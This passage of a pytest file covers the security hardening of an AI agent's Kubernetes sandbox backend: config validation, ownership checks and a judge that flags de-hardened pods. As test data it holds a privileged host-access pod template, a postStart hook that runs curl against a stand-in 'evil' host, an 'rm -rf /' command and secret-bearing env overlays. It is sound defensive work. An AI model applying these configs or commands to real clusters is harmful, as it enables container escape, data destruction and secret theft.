    assert validate_kubernetes_config(
        _kcfg(provisioner="sandbox", sandbox={"spec": {"ttlSeconds": 900}})
    ) == []
    assert validate_kubernetes_config(merge_kubernetes_config({})) == []


def test_a_root_uid_request_is_caught_offline():
    """The hardened base pins runAsNonRoot: true, so uid 0 is refused by the
    kubelet with CreateContainerConfigError. That used to be a named offline
    validation error; after the collapse it produced a pod stuck in
    CreateContainerConfigError instead. doctor's dry_run="All" + Strict cannot
    catch it either — the object is schema-valid, and Strict only rejects
    UNKNOWN fields."""
    for template in (
        {"spec": {"securityContext": {"runAsUser": 0}}},
        {"spec": {"containers": [
            {"name": "workspace", "securityContext": {"runAsUser": 0}}]}},
    ):
        problems = validate_kubernetes_config(_kcfg(pod_template=template))
        assert any("runAsUser=0" in p and "runAsNonRoot" in p
                   for p in problems), (template, problems)

    # A non-zero uid is the DOCUMENTED way to run a root-default image, so it
    # must stay clean...
    assert validate_kubernetes_config(
        _kcfg(pod_template={"spec": {"securityContext": {"runAsUser": 1000}}})
    ) == []
    # ...and runAsNonRoot: false on the CONTAINER really does clear it: that is
    # the scope the kubelet reads, so the pod is accepted.
    assert validate_kubernetes_config(_kcfg(pod_template={"spec": {
        "containers": [{"name": "workspace", "securityContext": {
            "runAsUser": 0, "runAsNonRoot": False}}]}})) == []


def test_the_effective_root_uid_pair_is_what_the_kubelet_rejects():
    """Per-SCOPE checking missed the most natural "run this session as root"
    config there is. `spec.securityContext: {runAsNonRoot: false, runAsUser: 0}`
    skipped the pod branch (that scope's own runAsNonRoot IS false) and skipped
    the container branch (that scope has no runAsUser) — while the kubelet pairs
    the container's runAsNonRoot: true, which the hardened base pins, with the
    uid 0 it inherits from the pod, and refuses the pod with
    CreateContainerConfigError. The check has to evaluate the EFFECTIVE pair the
    kubelet computes, one half from each scope."""
    problems = validate_kubernetes_config(_kcfg(pod_template={"spec": {
        "securityContext": {"runAsNonRoot": False, "runAsUser": 0}}}))
    assert any("runAsUser=0" in p and "runAsNonRoot" in p for p in problems), problems

    # The judge still owns the hardening half of the same config, unchanged.
    from tools.environments.kubernetes import unhardened_reasons

    assert any("runAsNonRoot" in r for r in unhardened_reasons(_kcfg(
        pod_template={"spec": {
            "securityContext": {"runAsNonRoot": False, "runAsUser": 0}}})))


def test_a_malformed_pod_template_is_rejected_not_discarded():
    """`pod_template:` written as a YAML list (a plausible mistake given the old
    "overrides" framing) used to be dropped whole by merge_pod_template's
    non-dict early return: the bare hardened base was submitted and the user's
    entire layer vanished with no message anywhere."""
    for bad in ([{"spec": {"hostPID": True}}], "hostPID: true", 42):
        problems = validate_kubernetes_config(_kcfg(pod_template=bad))
        assert any("must be a mapping" in p for p in problems), (bad, problems)


def test_mount_path_cannot_collide_with_the_tmp_emptydir():
    """The /tmp emptyDir is unconditional (init_session() writes its env
    snapshot there), so mount_path=/tmp renders a duplicate-mountPath pod the
    API server rejects at create time. Catching that offline is exactly what
    this validator is for — it already bounds container_name at 63 chars for
    the same reason."""
    problems = validate_kubernetes_config(_kcfg(mount_path="/tmp"))
    assert any("/tmp" in p for p in problems), problems
    assert validate_kubernetes_config(_kcfg(mount_path="/srv/work")) == []


def test_reserved_rejection_does_not_kill_the_feature_it_secures():
    """Reject only the named fields. A second volume, a mount at another path,
    a sidecar container and everything else in the PodSpec stay settable —
    which is why those two lists are merge-KEYED by identity."""
    kcfg = _kcfg(pod_template={"spec": {
        "volumes": [{"name": "cache", "emptyDir": {}}],
        "containers": [
            {"name": "workspace",
             "volumeMounts": [{"name": "cache", "mountPath": "/cache"}]},
            {"name": "sidecar", "image": "envoy"},
        ],
    }})
    assert validate_kubernetes_config(kcfg) == []
    template = render_pod_template(
        kcfg, persistent=False, image="i:1", resources=Resources(), pvc_name="pvc",
    )
    spec = template["spec"]
    assert {v["name"] for v in spec["volumes"]} == {"workspace", "tmp", "cache"}
    assert [c["name"] for c in spec["containers"]] == ["workspace", "sidecar"]
    mounts = spec["containers"][0]["volumeMounts"]
    assert {m["mountPath"] for m in mounts} == {"/workspace", "/tmp", "/cache"}
    # ...and the reserved core survived the merge intact.
    assert spec["containers"][0]["command"] == ["sleep", "infinity"]
    assert spec["restartPolicy"] == "Never"


def test_the_managed_by_label_is_on_the_rendered_template():
    template = render_pod_template(
        _kcfg(pod_template={"metadata": {"labels": {"team": "hermes"}}}),
        persistent=False, image="i:1", resources=Resources(), pvc_name="pvc",
    )
    assert template["metadata"]["labels"][MANAGED_BY] == "hermes-agent"
    assert template["metadata"]["labels"]["team"] == "hermes"


def test_sandbox_manifest_keeps_the_managed_by_label():
    manifest = _sandbox_provisioner().sandbox_manifest(
        "abc", persistent=False, image="i:1", resources=Resources()
    )
    assert manifest["metadata"]["labels"][MANAGED_BY] == "hermes-agent"
    assert manifest["spec"]["podTemplate"]["metadata"]["labels"][MANAGED_BY] == (
        "hermes-agent"
    )


def test_a_malformed_pod_template_loses_its_metadata_not_the_label():
    """merge_pod_template faithfully replaces a dict with a scalar/None, and the
    round-2 re-stamp then raised a bare AttributeError out of manifest
    construction while the offline validator said the config was fine."""
    for overlay in ({"metadata": None}, {"metadata": {"labels": None}},
                    {"metadata": {"labels": 7}}):
        kcfg = _kcfg(pod_template=overlay)
        template = render_pod_template(
            kcfg, persistent=False, image="i:1", resources=Resources(),
            pvc_name="hermes-ws",
        )
        assert template["metadata"]["labels"][MANAGED_BY] == "hermes-agent"
        problems = validate_kubernetes_config(kcfg)
        assert any("must be a mapping" in p for p in problems), (overlay, problems)


# ---------------------------------------------------------------------------
# Adoption requires ownership proof
# ---------------------------------------------------------------------------


def test_ensure_refuses_an_unowned_pod_that_carries_our_label():
    """`or not owners` accepted any labelled pod with no ownerReferences —
    which is exactly what another agent's workspace looks like."""
    from kubernetes.client.exceptions import ApiException

    api = MagicMock()
    api.create_namespaced_pod.side_effect = ApiException(status=409)
    api.read_namespaced_pod.return_value = _running_pod(
        labels={MANAGED_BY: "hermes-agent"}, owners=[],
    )
    p = _provisioner_with_api(api)
    with pytest.raises(RuntimeError, match="not created by this Hermes instance"):
        p.ensure("abc", persistent=False, image="img:1", resources=Resources())


def test_sandbox_refuses_to_adopt_a_cr_it_did_not_create():
    from kubernetes.client.exceptions import ApiException

    custom = MagicMock()
    custom.create_namespaced_custom_object.side_effect = ApiException(status=409)
    custom.get_namespaced_custom_object.return_value = {
        "metadata": {"uid": "sb-uid",
                     "ownerReferences": [{"uid": "somebody-else"}]},
        "status": {"conditions": [{"type": "Ready", "status": "True"}]},
    }
    p = _sandbox_provisioner(api=MagicMock(), custom=custom)
    with pytest.raises(RuntimeError, match="not created by this Hermes instance"):
        p.ensure("abc", persistent=False, image="i:1", resources=Resources())


def test_sandbox_resumes_its_own_cr_on_conflict():
    from kubernetes.client.exceptions import ApiException

    custom = MagicMock()
    custom.create_namespaced_custom_object.side_effect = ApiException(status=409)
    custom.get_namespaced_custom_object.return_value = {
        "metadata": {"uid": "sb-uid", "ownerReferences": [{"uid": OWNER_REF["uid"]}]},
        "status": {"conditions": [{"type": "Ready", "status": "True"}],
                   "podRef": {"name": "sandbox-pod-1"}},
    }
    api = MagicMock()
    api.read_namespaced_pod.return_value = _running_pod()
    p = _sandbox_provisioner(api=api, custom=custom)
    ref = p.ensure("abc", persistent=False, image="i:1", resources=Resources())
    assert ref.pod_name == "sandbox-pod-1"


def test_sandbox_refuses_a_pod_owned_by_a_different_sandbox():
    custom = MagicMock()
    custom.get_namespaced_custom_object.return_value = {
        "metadata": {"uid": "sb-uid"},
        "status": {"conditions": [{"type": "Ready", "status": "True"}],
                   "podRef": {"name": "someone-elses-pod"}},
    }
    api = MagicMock()
    api.read_namespaced_pod.return_value = _running_pod(
        owners=[SimpleNamespace(uid="another-sandbox")]
    )
    p = _sandbox_provisioner(api=api, custom=custom)
    with pytest.raises(RuntimeError, match="not owned by sandbox"):
        p.ensure("abc", persistent=False, image="i:1", resources=Resources())


# ---------------------------------------------------------------------------
# The pod_template merge rule
# ---------------------------------------------------------------------------


def test_pod_template_merges_containers_by_name():
    """A plain deep merge replaced spec.containers wholesale, dropping
    image/command/volumeMounts/securityContext — the pod then never becomes
    Ready."""
    template = render_pod_template(
        _kcfg(pod_template={"spec": {"containers": [
            {"name": "workspace", "env": [{"name": "A", "value": "1"}]}
        ]}}),
        persistent=False, image="img:1", resources=Resources(), pvc_name="pvc",
    )
    container = template["spec"]["containers"][0]
    assert container["image"] == "img:1"
    assert container["command"] == ["sleep", "infinity"]
    assert container["volumeMounts"]
    assert container["securityContext"]["allowPrivilegeEscalation"] is False
    assert {"name": "A", "value": "1"} in container["env"]


def test_volume_mounts_merge_on_mountpath_not_name():
    """The old heuristic keyed EVERY name-bearing list on `name`, which is not
    what the API server does for volumeMounts (patchMergeKey: mountPath). A
    new-name/existing-mountPath mount APPENDED, producing a duplicate-mountPath
    pod the kubelet rejects."""
    from tools.environments.kubernetes import merge_pod_template

    merged = merge_pod_template(
        {"spec": {"containers": [{"name": "workspace", "volumeMounts": [
            {"name": "workspace", "mountPath": "/workspace"}]}]}},
        {"spec": {"containers": [{"name": "workspace", "volumeMounts": [
            {"name": "other", "mountPath": "/workspace"}]}]}},
    )
    mounts = merged["spec"]["containers"][0]["volumeMounts"]
    assert len(mounts) == 1, mounts
    assert mounts[0]["name"] == "other"


def test_merge_appends_unmatched_keyed_entries_and_replaces_plain_lists():
    from tools.environments.kubernetes import merge_pod_template

    merged = merge_pod_template(
        {"spec": {"volumes": [{"name": "workspace", "emptyDir": {}}],
                  "tolerations": [{"key": "a"}]}},
        {"spec": {"volumes": [{"name": "extra", "emptyDir": {}}],
                  "tolerations": [{"key": "b"}]}},
    )
    assert [v["name"] for v in merged["spec"]["volumes"]] == ["workspace", "extra"]
    # No upstream merge key -> replace wholesale, loudly.
    assert merged["spec"]["tolerations"] == [{"key": "b"}]


def test_merge_keys_only_apply_at_their_anchored_paths():
    """The table is path-anchored, so a `containers` list somewhere else in the
    template is a plain list and replaces."""
    from tools.environments.kubernetes import merge_pod_template

    merged = merge_pod_template(
        {"metadata": {"containers": [{"name": "a"}]}},
        {"metadata": {"containers": [{"name": "b"}]}},
    )
    assert merged["metadata"]["containers"] == [{"name": "b"}]


# ---------------------------------------------------------------------------
# Misc correctness fixes
# ---------------------------------------------------------------------------


def test_pod_template_security_context_values_reach_the_manifest():
    """Vanilla Kubernetes needs a concrete UID for runAsNonRoot to schedule a
    root-default image, plus an fsGroup so it can write the workspace volume.
    Both now live in pod_template — including the falsy-but-legitimate 0, which
    a truthiness check used to drop silently."""
    template = render_pod_template(
        _kcfg(pod_template={"spec": {"securityContext": {
            "runAsNonRoot": False, "runAsUser": 0, "fsGroup": 0}}}),
        persistent=False, image="i:1", resources=Resources(), pvc_name="pvc",
    )
    assert template["spec"]["securityContext"]["runAsUser"] == 0
    assert template["spec"]["securityContext"]["fsGroup"] == 0

    sane = render_pod_template(
        _kcfg(pod_template={"spec": {"securityContext": {
            "runAsUser": 1000, "fsGroup": 1000}}}),
        persistent=False, image="i:1", resources=Resources(), pvc_name="pvc",
    )
    assert sane["spec"]["securityContext"]["runAsUser"] == 1000
    # The base's hardening survived the merge.
    assert sane["spec"]["securityContext"]["runAsNonRoot"] is True


def test_persistent_pod_without_an_owner_reference_gets_the_deadline_backstop():
    """A persistent pod with no ownerReference has no reaper at all; its PVC
    (the durable half) outlives the pod anyway."""
    owned = PodProvisioner(_kcfg(), "hermes", api=None, owner_reference=OWNER_REF)
    orphan = PodProvisioner(_kcfg(), "hermes", api=None, owner_reference=None)
    assert "activeDeadlineSeconds" not in owned.pod_manifest(
        "abc", persistent=True, image="i:1", resources=Resources())["spec"]
    assert orphan.pod_manifest(
        "abc", persistent=True, image="i:1", resources=Resources()
    )["spec"]["activeDeadlineSeconds"] == 14400


def test_wait_sandbox_does_not_list_pods_on_every_poll():
    """The label-selector fallback issues three LISTs; running it per 0.5s poll
    meant up to 720 LISTs per session provisioning."""
    custom = MagicMock()
    custom.get_namespaced_custom_object.side_effect = [
        {"metadata": {"uid": "sb"}, "status": {"conditions": []}},
        {"metadata": {"uid": "sb"}, "status": {"conditions": []}},
        {"metadata": {"uid": "sb"},
         "status": {"conditions": [{"type": "Ready", "status": "True"}],
                    "podRef": {"name": "sandbox-pod-1"}}},
    ]
    api = MagicMock()
    api.read_namespaced_pod.return_value = _running_pod()
    p = _sandbox_provisioner(api=api, custom=custom)
    ref = p.ensure("abc", persistent=False, image="i:1", resources=Resources())
    assert ref.pod_name == "sandbox-pod-1"
    api.list_namespaced_pod.assert_not_called()


def test_namespace_is_not_resolved_from_an_environment_variable(monkeypatch):
    """HERMES_POD_NAMESPACE was a redundant third source: in-cluster the kubelet
    projects the namespace and out-of-cluster the config key covers it."""
    import tools.environments.kubernetes as k8s_mod

    monkeypatch.setenv("HERMES_POD_NAMESPACE", "from-env")
    monkeypatch.setattr(k8s_mod, "_SA_NAMESPACE_FILE", "/nonexistent/namespace")
    with pytest.raises(ValueError):
        k8s_mod.resolve_namespace(_kcfg())
    assert k8s_mod.resolve_namespace(_kcfg(namespace="explicit")) == "explicit"


def test_kubernetes_blob_is_only_bridged_for_the_kubernetes_backend():
    """The ~1.2KB JSON payload used to land in the environment of every child
    process the agent spawns, for every backend."""
    from hermes_cli.config import apply_terminal_config_to_env

    local_env = apply_terminal_config_to_env(
        env={}, config={"terminal": {"backend": "local", "kubernetes": {"namespace": "x"}}},
        override=True,
    )
    assert "TERMINAL_KUBERNETES" not in local_env

    k8s_env = apply_terminal_config_to_env(
        env={},
        config={"terminal": {"backend": "kubernetes", "kubernetes": {"namespace": "x"}}},
        override=True,
    )
    assert json.loads(k8s_env["TERMINAL_KUBERNETES"])["namespace"] == "x"


# ---------------------------------------------------------------------------
# Override-bypass regressions
#
# Rounds 2 and 3 shipped, and a reviewer disproved, the claim that the pod the
# hardening judge evaluated was the pod that got submitted. The root cause was
# always the same: a SECOND pod-template override layer that only one code path
# applied, so every control inspecting the first layer's output was bypassable
# by moving the same YAML into the second.
#
# This design removes the bug class structurally: there is ONE render function,
# ONE user layer, and the second-source keys are rejected outright. The tests
# below are those regressions re-expressed against that design.
# ---------------------------------------------------------------------------

K8S_DIR = __import__("pathlib").Path(__file__).resolve().parents[2] / "k8s"


def _sandbox_kcfg(**sandbox):
    return _kcfg(provisioner="sandbox", sandbox=sandbox)


_DEHARDENING_TEMPLATE = {
    "spec": {
        "hostPID": True,
        "hostNetwork": True,
        "automountServiceAccountToken": True,
        "serviceAccountName": "cluster-admin-sa",
        "containers": [
            {"name": "workspace",
             "securityContext": {"privileged": True, "runAsUser": 0,
                                 "allowPrivilegeEscalation": True}},
        ],
        "volumes": [{"name": "host", "hostPath": {"path": "/"}}],
    }
}


def test_a_dehardened_pod_template_cannot_hide_from_the_judge():
    """THE root cause, in its surviving form. A pod with hostPID, hostNetwork,
    a hostPath '/' volume, a privileged root container and a mounted token must
    never count as a trusted throwaway sandbox — in EITHER provisioner mode,
    because both consume the same rendered template."""
    from tools.environments.kubernetes import unhardened_reasons
    from tools.terminal_tool import _kubernetes_has_host_access

    for kcfg in (_kcfg(pod_template=_DEHARDENING_TEMPLATE),
                 _sandbox_kcfg(spec={}) | {"pod_template": _DEHARDENING_TEMPLATE}):
        reasons = unhardened_reasons(kcfg)
        for expected in ("hostPID", "hostNetwork", "automountServiceAccountToken",
                         "serviceAccountName", "privileged", "host"):
            assert any(expected in reason for reason in reasons), (expected, reasons)
        assert _kubernetes_has_host_access({"kubernetes": kcfg}) is True

    # And the whole chain: the guards must actually stay on.
    from tools.approval import check_all_command_guards
    verdict = check_all_command_guards("rm -rf /", "kubernetes",
                                       has_host_access=True)
    assert verdict.get("approved") is not True or verdict.get("message")


def test_the_judged_pod_template_is_the_submitted_pod_template(monkeypatch):
    """Requirement 2, proven by RUNNING the judge — not by handing the same
    literals to both sides.

    The previous version of this test called ``render_pod_template`` itself with
    hand-chosen kwargs and compared that to the provisioners called with the
    SAME hand-chosen kwargs, so it proved only that the provisioners agree with
    the renderer. It never imported ``unhardened_reasons``, and it could not
    have detected judged-vs-submitted drift, which is the entire bug class
    requirement 2 exists to eliminate.

    What is asserted here, for BOTH provisioners:
      1. the real judge and the real provisioner render from the SAME kcfg
         object, through the one renderer, exactly once each;
      2. the template the provisioner POSTs IS (object identity) the renderer's
         return value — nothing runs after the renderer;
      3. judging the actually-submitted artifact with ``template_reasons``
         yields the same verdict the config-level judge reached.
    """
    import tools.environments.kubernetes as k8s_mod
    import tools.environments.kubernetes_sandbox as sandbox_mod
    from tools.environments.kubernetes import template_reasons, unhardened_reasons

    real_render = k8s_mod.render_pod_template

    for provisioner in ("pod", "sandbox"):
        kcfg = _kcfg(provisioner=provisioner, pod_template=_DEHARDENING_TEMPLATE)
        calls: list[tuple] = []

        def _recording(cfg, **kwargs):
            rendered = real_render(cfg, **kwargs)
            calls.append((cfg, kwargs, rendered))
            return rendered

        monkeypatch.setattr(k8s_mod, "render_pod_template", _recording)
        monkeypatch.setattr(sandbox_mod, "render_pod_template", _recording)

        # (1) The REAL judge, driven through the real path.
        config_verdict = unhardened_reasons(kcfg)
        assert len(calls) == 1, calls
        judged_cfg, _, judged = calls[0]
        assert judged_cfg is kcfg

        # (2) The REAL provisioner, and the object it would POST.
        if provisioner == "sandbox":
            body = _sandbox_cls()(
                kcfg, "hermes", api=None, owner_reference=OWNER_REF,
                custom_api=None,
            ).sandbox_manifest("abc", persistent=False, image="i:1",
                               resources=Resources())
            submitted = body["spec"]["podTemplate"]
        else:
            body = PodProvisioner(
                kcfg, "hermes", api=None, owner_reference=OWNER_REF,
            ).pod_manifest("abc", persistent=False, image="i:1",
                           resources=Resources())
            submitted = {"metadata": body["metadata"], "spec": body["spec"]}

        assert len(calls) == 2, calls
        submitted_cfg, _, rendered = calls[1]
        assert submitted_cfg is kcfg
        # Object identity, not equality: proves no layer ran after the renderer.
        assert submitted["spec"] is rendered["spec"]

        # (3) Judging the SUBMITTED artifact reaches the same verdict as
        # judging the config. If a provisioner ever re-authored the spec, the
        # two verdicts would part company here.
        assert template_reasons(submitted) == template_reasons(judged)
        assert template_reasons(submitted) == config_verdict

        # The de-hardening is real, so this is not vacuously true on [].
        assert submitted["spec"]["hostPID"] is True
        assert config_verdict


def test_the_judge_sees_the_whole_sandbox_cr_not_just_its_pod_template():
    """On the sandbox path the artifact SUBMITTED is the Sandbox CR, and
    ``sandbox.spec`` is deep-copied into it verbatim. Requirement 2 therefore
    only holds there if every CR-spec key is rendered by Hermes, reviewed by
    Hermes, or judged as unknown. A two-name denylist is not that: the CRD
    coordinates are themselves user config, so a CRD version whose pod-authoring
    field has another name walks straight past it."""
    from tools.environments.kubernetes import unhardened_reasons
    from tools.terminal_tool import _kubernetes_has_host_access

    kcfg = _sandbox_kcfg(spec={"networkPolicy": {"egress": "allow-all"},
                               "hostAccess": True})
    reasons = unhardened_reasons(kcfg)
    for key in ("networkPolicy", "hostAccess"):
        assert any(key in reason for reason in reasons), (key, reasons)
    assert _kubernetes_has_host_access({"kubernetes": kcfg}) is True

    # ...and every one of those keys really is submitted verbatim.
    submitted = _sandbox_cls()(
        kcfg, "hermes", api=None, owner_reference=OWNER_REF, custom_api=None,
    ).sandbox_manifest("abc", persistent=False, image="i:1",
                       resources=Resources())["spec"]
    assert submitted["hostAccess"] is True

    # The reviewed key is not noise: ttlSeconds only ever SHORTENS the
    # workspace's life, so it stays hardened.
    assert unhardened_reasons(_sandbox_kcfg(spec={"ttlSeconds": 60})) == []
    # And the pod path is untouched by the sandbox arm.
    assert unhardened_reasons(_kcfg()) == []


def test_there_is_exactly_one_pod_template_source():
    """Structural guard for issue requirement 2. The sandbox provisioner must
    ASSIGN the rendered template, never merge a second one over it — so
    monkeypatching the single renderer changes the submitted object completely."""
    import tools.environments.kubernetes_sandbox as sandbox_mod

    sentinel = {"metadata": {"labels": {}}, "spec": {"marker": "the-only-source"}}
    original = sandbox_mod.render_pod_template
    try:
        sandbox_mod.render_pod_template = lambda *a, **kw: sentinel
        manifest = _sandbox_provisioner(
            spec={"ttlSeconds": 5}
        ).sandbox_manifest("abc", persistent=False, image="i:1",
                           resources=Resources())
    finally:
        sandbox_mod.render_pod_template = original
    assert manifest["spec"]["podTemplate"] == sentinel
    assert manifest["spec"]["ttlSeconds"] == 5


def test_a_second_pod_template_source_is_a_config_error_not_a_merge():
    """`sandbox.spec.podTemplate` was the second layer. It is now rejected —
    the only way to keep 'the object you validated' and 'the object you submit'
    the same object."""
    kcfg = _sandbox_kcfg(spec={"podTemplate": _DEHARDENING_TEMPLATE})
    problems = validate_kubernetes_config(kcfg)
    assert any("sandbox.spec.podTemplate" in p and "reserved" in p
               for p in problems), problems
    # ...and the manifest builder REFUSES it even unvalidated, exactly as
    # render_pod_template refuses a reserved pod_template field. Silently
    # overwriting the user's key would still have posted the CR.
    with pytest.raises(ValueError, match="podTemplate"):
        _sandbox_cls()(
            kcfg, "hermes", api=None, owner_reference=OWNER_REF, custom_api=None,
        ).sandbox_manifest("abc", persistent=False, image="i:1",
                           resources=Resources())


def test_an_operator_authored_pod_shape_has_no_door_left():
    """template_ref / use_claim / spec_overrides.sandboxTemplateRef were three
    doors to a pod built from a SandboxTemplate Hermes never reads — a pod
    whose hardening cannot be established, which must never read as hardened.
    All three are gone; the surviving door is a flat rejection."""
    assert "template_ref" not in DEFAULT_KUBERNETES_CONFIG["sandbox"]
    assert "use_claim" not in DEFAULT_KUBERNETES_CONFIG["sandbox"]

    kcfg = _sandbox_kcfg(spec={"sandboxTemplateRef": {"name": "privileged"}})
    problems = validate_kubernetes_config(kcfg)
    assert any("sandboxTemplateRef" in p and "reserved" in p for p in problems)

    # Defence in depth: the judge must NOT depend on validation having run. A
    # SandboxTemplate makes the operator author a pod this backend never
    # renders, so the pod shape is unknowable — and unknown is not hardened.
    # (Round 3 established exactly this; the collapse dropped the arm and the
    # judge started returning [] for a config it cannot evaluate.)
    from tools.environments.kubernetes import unhardened_reasons
    from tools.terminal_tool import _kubernetes_has_host_access

    reasons = unhardened_reasons(kcfg)
    assert any("sandboxTemplateRef" in reason for reason in reasons), reasons
    assert _kubernetes_has_host_access({"kubernetes": kcfg}) is True

    # And the ref never reaches the API server at all: the manifest builder
    # refuses to post a CR carrying a pod source Hermes did not render.
    with pytest.raises(ValueError, match="sandboxTemplateRef"):
        _sandbox_cls()(
            kcfg, "hermes", api=None, owner_reference=OWNER_REF, custom_api=None,
        ).sandbox_manifest("abc", persistent=False, image="i:1",
                           resources=Resources())


def test_secret_bearing_env_is_not_a_throwaway_sandbox():
    """The policy blocks secret VOLUMES because a pod that can mount Secrets can
    exfiltrate the namespace. envFrom/secretKeyRef is the same surface, and it
    is the shape the shipped config docs describe."""
    from tools.environments.kubernetes import unhardened_reasons

    for overlay in (
        {"spec": {"containers": [
            {"name": "workspace",
             "envFrom": [{"secretRef": {"name": "hermes-provider-keys"}}]}]}},
        {"spec": {"containers": [
            {"name": "workspace", "env": [
                {"name": "AWS_SECRET_ACCESS_KEY",
                 "valueFrom": {"secretKeyRef": {"name": "aws", "key": "sk"}}}]}]}},
    ):
        reasons = unhardened_reasons(_kcfg(pod_template=overlay))
        assert any("Secret" in reason for reason in reasons), (overlay, reasons)


@pytest.mark.parametrize("overlay, expected", [
    # The base pins seccompProfile: RuntimeDefault; pod_template is the
    # documented layer sitting on top of it, so every axis that switches the
    # runtime confinement off has to cost the approval skip.
    ({"spec": {"securityContext": {"seccompProfile": {"type": "Unconfined"}}}},
     "seccompProfile"),
    ({"spec": {"containers": [{"name": "workspace", "securityContext": {
        "seccompProfile": {"type": "Unconfined"}}}]}}, "seccompProfile"),
    ({"spec": {"containers": [{"name": "workspace", "securityContext": {
        "procMount": "Unmasked"}}]}}, "procMount"),
    ({"spec": {"containers": [{"name": "workspace", "securityContext": {
        "appArmorProfile": {"type": "Unconfined"}}}]}}, "appArmorProfile"),
    # spc_t is the well-known OpenShift escape.
    ({"spec": {"containers": [{"name": "workspace", "securityContext": {
        "seLinuxOptions": {"type": "spc_t"}}}]}}, "seLinuxOptions"),
    ({"spec": {"shareProcessNamespace": True}}, "shareProcessNamespace"),
    # postStart runs as the container's user with the pod's network and mounts,
    # and nothing in this backend renders or reviews it.
    ({"spec": {"containers": [{"name": "workspace", "lifecycle": {
        "postStart": {"exec": {"command": ["curl", "http://evil"]}}}}]}},
     "lifecycle"),
    # uid 0 at POD level: the container-level check never saw it.
    ({"spec": {"securityContext": {"runAsUser": 0}}}, "runAsUser"),
])
def test_confinement_relaxations_cost_the_approval_skip(overlay, expected):
    """The approval-guard skip is earned by a THROWAWAY sandbox. Each of these
    renders into the submitted pod verbatim and each one relaxes the hardened
    base, so a judge that does not see them hands the skip to a pod that no
    longer qualifies for it."""
    from tools.environments.kubernetes import unhardened_reasons
    from tools.terminal_tool import _kubernetes_has_host_access

    kcfg = _kcfg(pod_template=overlay)
    reasons = unhardened_reasons(kcfg)
    assert any(expected in reason for reason in reasons), (overlay, reasons)
    assert _kubernetes_has_host_access({"kubernetes": kcfg}) is True


def test_validatingadmissionpolicy_does_not_claim_the_label_is_unconfigurable():
    """A false security claim in shipped docs is worse than the bug: the round-2
    header asserted the matchCondition "cannot be configured away", which a
    second override layer disproved. The retraction stays."""
    text = (K8S_DIR / "validatingadmissionpolicy.yaml").read_text(encoding="utf-8")
    assert "cannot be configured away" not in text
    assert "retracted" in text
    # The surviving honest limitation: a compromised agent talking to the API
    # server directly is not bound by any of this.
    assert "compromised agent" in text


def test_validatingadmissionpolicy_covers_secret_backed_env():
    text = (K8S_DIR / "validatingadmissionpolicy.yaml").read_text(encoding="utf-8")
    assert "envFrom" in text and "secretRef" in text
    assert "secretKeyRef" in text


def test_shipped_policies_do_not_document_deleted_config_keys():
    """The policies are COUPLED to config.yaml and say so. Naming keys that no
    longer exist sends an operator to a knob they cannot find."""
    for name in ("networkpolicy.yaml", "validatingadmissionpolicy.yaml",
                 "rbac.yaml", "README.md"):
        text = (K8S_DIR / name).read_text(encoding="utf-8")
        for gone in ("template_ref", "use_claim", "spec_overrides",
                     "pod_template_overrides", "security_context",
                     "runtime_class_name"):
            assert gone not in text, f"{name} still documents {gone}"


def test_networkpolicy_and_readme_state_what_the_label_selector_covers():
    text = (K8S_DIR / "networkpolicy.yaml").read_text(encoding="utf-8")
    # It selects on the managed-by label, and says why config cannot strip it.
    assert "app.kubernetes.io/managed-by" in text
    assert "rejected config" in text and "no second override layer" in text
    readme = (K8S_DIR / "README.md").read_text(encoding="utf-8")
    assert "credential files at rest" in readme
    # The retraction survives in prose: the backend does not claim to bound a
    # compromised agent's direct API calls.
    assert "compromised agent" in readme


def test_pvc_adoption_refuses_a_foreign_claim():
    """The PVC is mounted at the agent's cwd and the session-start sync writes
    credential files into it, yet adoption had no ownership or label check at
    all — and pvc_name() is deliberately not instance-scoped."""
    api = MagicMock()
    api.read_namespaced_persistent_volume_claim.return_value = _hermes_pvc(
        labels={"owner": "someone-else"}
    )
    p = _provisioner_with_api(api)
    with pytest.raises(RuntimeError, match="not a Hermes workspace"):
        p.ensure("mytask", persistent=True, image="img:1", resources=Resources())
    api.create_namespaced_pod.assert_not_called()


def test_rfc1123_validation_enforces_the_length_it_promises():
    """The error message promised 'max 63 chars'; the regex had no bound, so a
    70-character name passed `hermes doctor` and was rejected by the API server
    at create time instead."""
    long_name = "a" * 70
    assert any("container_name" in p
               for p in validate_kubernetes_config(_kcfg(container_name=long_name)))
    assert any("claim_name" in p for p in validate_kubernetes_config(
        _kcfg(volume={"claim_name": long_name})))


def test_sanitize_name_hashes_case_only_normalisation():
    """The collision guard compared the slug against a LOWERCASED copy of the
    input, so case-only normalisation never got the hash suffix and two task ids
    differing only in case shared one pod AND one PVC."""
    assert sanitize_name("Default") != sanitize_name("default")
    assert sanitize_name("Foo-Bar") != sanitize_name("foo-bar")
    assert sanitize_name("default") == "default"


def test_kill_cancels_only_its_own_exec(monkeypatch):
    """_active_stream/_cancelled were single-slot per environment. Because
    _wait_for_process calls _kill_process() on an ORDINARY TIMEOUT (base.py),
    command A timing out closed command B's websocket: B returned rc=130
    'interrupted' with truncated output while A ran on untouched."""
    env = _make_k8s_env(monkeypatch, [("", 0)])
    # update_sleep keeps both execs genuinely in flight while kill() lands.
    clients = {"a": _FakeWSClient(open_cycles=10_000, update_sleep=0.01),
               "b": _FakeWSClient(open_cycles=10_000, update_sleep=0.01)}
    handed: list[str] = []
    opened = {"a": threading.Event(), "b": threading.Event()}
    lock = threading.Lock()

    def fake_stream(*args, **kwargs):
        with lock:
            key = "a" if "a" not in handed else "b"
            handed.append(key)
        client = clients[key]
        opened[key].set()
        return client

    monkeypatch.setattr("kubernetes.stream.stream", fake_stream)
    handle_a = env._run_bash("sleep 3600")
    assert opened["a"].wait(5)
    handle_b = env._run_bash("sleep 3600")
    assert opened["b"].wait(5)
    time.sleep(0.1)  # let B's worker publish its stream

    handle_a.kill()
    assert handle_a.wait(timeout=5) == 130
    assert clients["a"].closed is True
    assert clients["b"].closed is False, "kill() closed an unrelated exec"
    assert handle_b.poll() is None, "an unrelated exec was reported interrupted"
    handle_b.kill()


def test_sandbox_refuses_a_pod_resolved_only_by_name_convention():
    """_resolve_pod_name falls back to the name convention, and
    _assert_pod_belongs returned early on a pod with no ownerReferences — so a
    co-tenant's pod under a guessable name was accepted, and the next action is
    a credential-file upload into it."""
    custom = MagicMock()
    custom.get_namespaced_custom_object.return_value = {
        "metadata": {"uid": "sandbox-uid"},
        "status": {"conditions": [{"type": "Ready", "status": "True"}]},
    }
    api = MagicMock()
    api.list_namespaced_pod.return_value = SimpleNamespace(items=[])
    api.read_namespaced_pod.return_value = _running_pod(owners=[])

    p = _sandbox_provisioner(api=api, custom=custom)
